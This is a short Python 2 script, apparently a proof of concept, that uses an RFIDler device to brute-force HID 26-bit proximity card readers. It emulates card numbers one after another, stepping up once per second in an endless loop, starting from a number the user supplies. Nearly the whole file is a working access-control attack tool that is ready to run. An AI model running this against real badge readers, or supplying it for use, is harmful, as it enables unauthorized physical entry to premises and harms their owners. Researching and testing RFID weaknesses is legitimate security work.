import sys
import time
import RFIDler

def banner():
	    print 
	    print "##################################################"
	    print "#                                                #"
	    print "# Proof of concept hid26 BruteForce with RFIDler #"
	    print "#           Created by Kevin2600                 #"
	    print "#                                                #"
	    print "##################################################"
        
def usage():
	   banner()
	   print
	   print "Example: python BruteHID.py /dev/ttyACM0 12387654"
	   sys.exit(1)

if len(sys.argv) !=3: 
	usage()


s = sys.argv[2]

port = sys.argv[1]
rfidler = RFIDler.RFIDler()
result, reason = rfidler.connect(port)

if not result:
    print 'Warning - could not open serial port:', reason


result, data=rfidler.command("set tag hid26")

while True:
   
   result, data=rfidler.command("emu " + s);

   #result, data=rfidler.command("emu " + str(0) + s);
      
   time.sleep(1)

   s = str(int(s) + 1) 
  
   print s

  

